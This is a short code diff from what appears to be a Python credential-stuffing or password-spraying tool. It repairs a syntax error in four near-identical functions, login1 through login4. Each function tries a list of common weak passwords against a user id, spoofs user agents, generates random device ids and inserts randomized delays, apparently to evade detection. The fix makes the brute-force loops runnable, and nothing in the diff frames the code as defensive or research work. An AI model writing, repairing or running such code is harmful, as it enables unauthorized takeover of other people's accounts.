@@ -825,7 +825,7 @@ def login1(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))    
-        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]:
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
@@ -899,7 +899,7 @@ def login2(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))
-        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]:
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
@@ -969,7 +969,7 @@ def login3(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))
-        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]:
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
@@ -1040,7 +1040,7 @@ def login4(uid):
         else:
             ua = windows()
         time.sleep(random.uniform(2, 4))
-        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]
+        for pw in ["123456","1234567","12345678","123456789","111222","786786","123123"]:
             time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
